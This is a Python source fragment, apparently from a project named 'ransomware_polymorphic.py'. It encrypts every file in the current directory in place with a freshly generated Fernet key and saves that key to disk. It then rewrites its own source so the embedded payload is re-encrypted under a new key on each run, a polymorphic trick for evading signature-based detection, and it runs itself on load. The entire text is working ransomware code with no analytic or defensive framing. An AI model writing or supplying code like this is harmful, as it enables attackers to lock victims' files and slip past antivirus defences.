def run():
    files = []

    for file in os.listdir():
        if file == "ransomware_polymorphic.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    key1 = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key1)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key1).encrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_encrypted)

    fname = os.path.basename(__file__)
    lines = []
    with open(fname, 'r') as f:
        lines = f.readlines()
    
    with open('lol', 'w') as f:
        for line in lines:
            if line.startswith("# START"):
                break
            f.write(line)

        f.write("# START\n")
        global key
        global token

        fer = Fernet(key)
        virus = fer.decrypt(token).decode()

        key = Fernet.generate_key()
        fer = Fernet(key)
        token = fer.encrypt(virus.encode())
    
        f.write("key = \"{}\"\n".format(key.decode()))
        f.write("token = \"{}\"\n".format(token.decode()))
        f.write("\ndecrypt(token, key)\n")
    
    os.remove(fname)
    os.rename("lol", fname)

run()